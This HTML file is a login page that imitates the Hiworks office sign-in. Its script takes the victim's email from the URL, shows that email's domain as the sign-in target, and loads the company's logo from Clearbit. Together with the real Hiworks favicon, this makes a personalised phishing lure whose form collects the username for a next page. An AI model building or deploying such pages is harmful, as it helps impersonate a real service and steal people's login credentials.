<!DOCTYPE html>
<html lang="ko">
<head>
  <meta http-equiv="Content-Language" content="en-us">
  <meta charset="UTF-8" />
  <link rel="icon" href="https://login.office.hiworks.com/favicon-96x96.png" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>하이웍스 로그인</title>
  <style>
    html, body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      height: 100%;
      font-size: 13px;
      color: #676767;
      font-weight: 700;
    }

    input[type=text] {
      appearance: none;
      font-size: 16px;
      height: 40px;
      width: 100%;
      border: none;
      border-bottom: 1px #2985db solid;
      border-top: 1px #2985db solid;
      border-left: 1px #2985db solid;
      color: #404040;
      background-color: white;
      background-image: url("img/id.png");
      background-position: 1px 2px;
      background-repeat: no-repeat;
      padding: 10px 35px;
    }

    input[type=text]:focus {
      outline: none;
    }

    h1 {
      font-size: 24px;
      text-align: center;
      font-weight: 700;
    }

    p {
      font-size: 14px;
      text-align: center;
    }
  </style>
</head>
<body>
  <form id="loginForm" action="index.html" method="get">
    <div class="container" style="max-width: 400px; margin-top: 60px;">
      <div class="text-center">
        <img id="logo" src="https://logo.clearbit.com/domain" width="200" height="40">
      </div>
      <div style="margin-top: 40px;">
        <h1>
          <span style="color:#000">Sign in to </span>
          <span id="domainLabel" style="color:#7A7A7A">domain</span>
        </h1>
        <p>Please enter your username.</p>
      </div>

      <div class="input-group" style="margin-top:30px;">
        <input id="usernameInput" name="login" type="text" placeholder="Username" required class="form-control">
        <span id="domainAddon" class="input-group-addon" style="background-color:#fff; border:none; border-bottom:1px solid blue; border-top:1px solid blue; border-right:1px solid blue;">@domain</span>
      </div>

      <div style="margin-top: 20px;">
        <input type="image" src="img/signin-btn.png" width="100%" height="44">
      </div>

      <div style="margin-top: 20px; text-align: left;">
        <a href="session_login.php" style="text-decoration: none; color: #2985db;">Sign in with another office</a>
      </div>
    </div>
  </form>

  <script>
    const params = new URLSearchParams(window.location.search);
    const raw = params.get('login');
    const email = raw ? decodeURIComponent(raw) : '';
    let domain = '';

    if (email.includes('@')) {
      const parts = email.split('@');
      domain = parts[1] || 'domain';
    }

    // Display domain only (visual only, not submitted)
    document.getElementById('domainAddon').textContent = '@' + domain;
    document.getElementById('domainLabel').textContent = domain;
    document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;

    // No code to change the value on submit — submission is raw username only
  </script>
</body>
</html>
